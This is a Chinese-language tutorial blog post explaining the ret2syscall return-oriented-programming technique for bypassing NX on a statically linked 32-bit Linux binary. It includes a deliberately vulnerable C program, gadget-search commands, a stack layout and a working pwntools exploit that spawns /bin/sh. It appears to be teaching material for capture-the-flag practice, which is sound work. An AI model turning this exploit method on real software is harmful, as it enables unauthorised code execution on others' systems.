---
title: ret2syscall
date: 2026-01-22 17:05:33
tags: 
  - Pwn
---

ret2syscall (Return to System Call) 是一种利用 ROP (Return Oriented Programming) 技术来绕过 NX (No-Execute) 保护的攻击手段。

它的核心原理是：我们不再依赖程序里现有的函数（如 `system`）或自己写入的 Shellcode，而是利用程序中零散的汇编指令片段（Gadgets），拼凑出一套“系统调用（System Call）”的参数，最后执行系统调用指令进内核拿 Shell。

### ret2syscall 的核心原理

要理解 ret2syscall，必须先理解 Linux 系统是如何执行系统调用的。

#### 为什么要用它？

* NX 开启：栈不可执行，无法使用 `ret2shellcode`。
* 静态编译 (Statically Linked)：这是 `ret2syscall` 最常见的应用场景。静态编译的程序没有动态链接库 (libc)，虽然体积大，但里面包含了大量的代码片段（Gadgets），非常适合我们在里面“淘宝”凑指令。
* 没有 `system` 函数**：程序里没调用过 `system`，无法直接 `ret2text`。

#### 系统调用规则 (以 32位 x86 为例)

在 Linux 32位系统中，触发系统调用（如 `execve`）需要满足以下寄存器状态：

| 寄存器 | 作用       | 目标值 (执行 execve)           |
| ------ | ---------- | ------------------------------ |
| EAX    | 系统调用号 | 0xb (十进制 11，代表 `execve`) |
| EBX    | 第一个参数 | 指向 "/bin/sh" 字符串的地址    |
| ECX    | 第二个参数 | 0 (NULL)                       |
| EDX    | 第三个参数 | 0 (NULL)                       |
| 指令   | 触发调用   | `int 0x80`                     |

攻击逻辑：
我们需要在栈上构造一个 ROP 链，利用 `pop` 指令把栈上的数据弹入寄存器，最后跳转到 `int 0x80`。

### 一个典型的 ret2syscall 例子

假设我们有一个静态编译的 32 位程序 `pwn_static`。

#### 漏洞源码

```c
// gcc -m32 -static -fno-stack-protector -o pwn_static source.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[32];
    puts("Give me some gadgets:");
    read(0, buf, 200); // 典型的栈溢出
}

int main() {
    vuln();
    return 0;
}

```

#### 攻击准备：寻找 Gadgets

我们需要用工具（如 `ROPgadget`）在二进制文件里寻找能够操作寄存器的指令片段。

我们需要凑齐：

1. 控制 EAX: `pop eax; ret`
2. 控制 EBX, ECX, EDX: `pop ebx; pop ecx; pop edx; ret` (或者分开找)
3. 字符串: `/bin/sh` 的地址
4. 触发指令: `int 0x80`

模拟查找过程：

```bash
# 1. 找控制 eax 的 gadget
$ ROPgadget --binary pwn_static --only "pop|ret" | grep eax
0x0809c376 : pop eax ; ret

# 2. 找控制 ebx, ecx, edx 的 gadget
$ ROPgadget --binary pwn_static --only "pop|ret" | grep "pop edx"
# 假设找到了一个完美的合体 gadget (常见于静态编译程序)
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret

# 3. 找 "/bin/sh" 字符串
$ ROPgadget --binary pwn_static --string "/bin/sh"
0x080be408 : /bin/sh

# 4. 找 int 0x80
$ ROPgadget --binary pwn_static --opcode "cd80"
0x08049421 : int 0x80

```

#### 构造 Payload

我们需要在栈上精心排列数据，让 `pop` 指令像吃豆人一样，把我们放在栈上的数据“吃”进寄存器。

栈布局设计：

```text
+-------------------+
|   Padding (44字节) | <-- 覆盖 buf + old_ebp
+-------------------+
| 0x0809c376        | <-- pop eax; ret
+-------------------+
| 0x0000000b        | <-- 0xb (execve号) -> 存入 EAX
+-------------------+
| 0x0806eb90        | <-- pop edx; pop ecx; pop ebx; ret
+-------------------+
| 0x00000000        | <-- 0 -> 存入 EDX
+-------------------+
| 0x00000000        | <-- 0 -> 存入 ECX
+-------------------+
| 0x080be408        | <-- "/bin/sh"地址 -> 存入 EBX
+-------------------+
| 0x08049421        | <-- int 0x80 (触发系统调用)
+-------------------+

```

#### Exploit 脚本 (Pwntools)

```python
from pwn import *

context(os='linux', arch='i386', log_level='debug')
# p = process('./pwn_static')
elf = ELF('./pwn_static')

# 1. 获取 Gadgets 地址 (假设通过 ROPgadget 找到的)
pop_eax_ret = 0x0809c376
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
bin_sh_addr = 0x080be408

# 2. 构造 Payload
offset = 44 # 32(buf) + 4(alignment/padding) + 4(ebp) -> 需调试确认

payload = flat([
    b'A' * offset,
    
    # 第一步：设置 EAX = 0xb
    pop_eax_ret,
    0xb,
    
    # 第二步：设置 EBX, ECX, EDX
    # 注意顺序必须和 gadget 的 pop 顺序完全一致
    # gadget 是: pop edx ; pop ecx ; pop ebx ; ret
    pop_edx_ecx_ebx_ret,
    0,              # pop edx
    0,              # pop ecx
    bin_sh_addr,    # pop ebx
    
    # 第三步：触发中断
    int_0x80
])

# 3. 发送
# p.sendline(payload)
# p.interactive()

```

### 64位系统的区别 (ret2syscall 64-bit)

如果是 64 位程序，原理完全一样，但有三点不同：

1. 寄存器不同：
* 调用号存入 RAX (execve 是 59，即 0x3b)。
* 参数顺序：RDI (filename), RSI (argv), RDX (envp)。

1. 触发指令不同：
* 使用 `syscall` 而不是 `int 0x80`。

1. Gadget 查找：
* 你需要找 `pop rdi; ret`, `pop rsi; ret` 等。


### 总结

* ret2syscall = 收集 Gadgets -> 设置系统调用号和参数寄存器 -> 执行 syscall/int 0x80。
* 它是手动拼装出一个 `execve("/bin/sh")`。
* 它是对抗 静态编译 + NX 保护 的神器。
